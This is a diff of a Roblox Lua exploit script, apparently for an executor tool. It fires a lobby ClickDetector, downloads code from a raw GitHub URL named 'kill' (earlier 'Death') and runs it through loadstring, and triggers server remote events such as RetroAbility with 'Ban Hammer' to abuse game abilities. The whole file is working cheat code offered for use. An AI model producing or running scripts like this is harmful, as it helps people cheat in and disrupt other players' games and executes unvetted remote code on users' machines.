@@ -1,45 +1,31 @@
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local function executeActions()
+    -- First action: Fire the ClickDetector
+    fireclickdetector(workspace.Lobby.Frostbite.ClickDetector)
 
--- Function to fire the ClickDetector
-local function fireClickDetector()
-    local clickDetector = workspace.Lobby.Frostbite.ClickDetector
-    if clickDetector then
-        fireclickdetector(clickDetector)
-    else
-        print("ClickDetector not found.")
-    end
+    -- Wait for 0.01 seconds
+    task.wait(0.01)
+
+    -- Second action: Execute the first loadstring
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/kill')))()
+
+    -- Wait for 0.001 seconds (1 millisecond)
+    task.wait(0.001)
+
+    -- Third action: Fire the GeneralAbility server
+    game:GetService("ReplicatedStorage").GeneralAbility:FireServer("0")
+
+    -- Wait for 0.01 seconds
+    task.wait(0.01)
+
+    -- Fourth action: Execute the second loadstring
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/kill')))()
+
+    -- Wait for 0.6 seconds
+    task.wait(0.6)
+
+    -- Fifth action: Fire the RetroAbility server with "Ban Hammer"
+    game:GetService("ReplicatedStorage").RetroAbility:FireServer("Ban Hammer")
 end
 
--- Function to execute a loadstring from a URL
-local function executeLoadstring(url)
-    local scriptCode = game:HttpGet(url)
-    loadstring(scriptCode)()
-end
-
--- Execute the ClickDetector fire
-fireClickDetector()
-
--- Wait 1 millisecond (0.001 seconds)
-task.wait(0.001)
-
--- Execute the first loadstring
-executeLoadstring('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/Death')
-
--- Wait 1 millisecond (0.001 seconds)
-task.wait(0.001)
-
--- Execute the first remote event
-ReplicatedStorage.GeneralAbility:FireServer("0")
-
--- Wait another 1 millisecond
-task.wait(0.1)
-
--- Execute the second loadstring
-executeLoadstring('https://raw.githubusercontent.com/LoserGrape/Pooshiesty/main/Death')
-
--- Wait another 1 millisecond
-task.wait(0.1)
-
--- Execute the second remote event
-ReplicatedStorage.RetroAbility:FireServer("Ban Hammer")
+-- Execute the function
+executeActions()
